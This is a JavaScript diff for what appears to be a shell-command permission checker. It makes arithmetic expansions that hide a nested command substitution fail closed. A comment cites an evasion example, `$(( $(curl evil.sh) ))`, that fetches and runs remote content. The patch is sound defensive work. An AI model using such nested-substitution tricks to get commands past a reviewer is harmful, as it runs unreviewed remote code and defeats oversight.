@@ -46,11 +46,29 @@ function extractSubstitutionCommands(command) {
   return inner;
 }
 
+// Arithmetic shell `$(( ... ))` is not dynamic execution by itself
+// (`echo $((1+1))` stays allow), but arithmetic whose body itself embeds a
+// substitution (`$(( $(curl evil.sh) ))`) executes dynamic content at runtime
+// and must be treated as unresolvable: the flat `[^)]*` extraction cannot see
+// through the nested parens, so the nesting otherwise escapes detection
+// (#1055 D4-17 review follow-up).
+const ARITHMETIC_SHELL_RE = /\$\(\(([\s\S]*?)\)\)/g;
+
+function hasArithmeticShellSubstitution(command) {
+  const text = String(command || '');
+  for (const match of text.matchAll(ARITHMETIC_SHELL_RE)) {
+    const body = match[1] || '';
+    if (body.includes('$(') || body.includes('`')) return true;
+  }
+  return false;
+}
+
 // Nested substitution (a substitution whose payload itself contains `$(` or a
 // backtick) resolves only at runtime — no static rule can review what will
 // execute. The engine must fail closed on it instead of returning allow
 // (fail-open, #1055 D4-17).
 function hasUnresolvableSubstitution(command) {
+  if (hasArithmeticShellSubstitution(command)) return true;
   const payloads = extractSubstitutionCommands(command);
   return payloads.some((payload) => payload.includes('$(') || payload.includes('`'));
 }
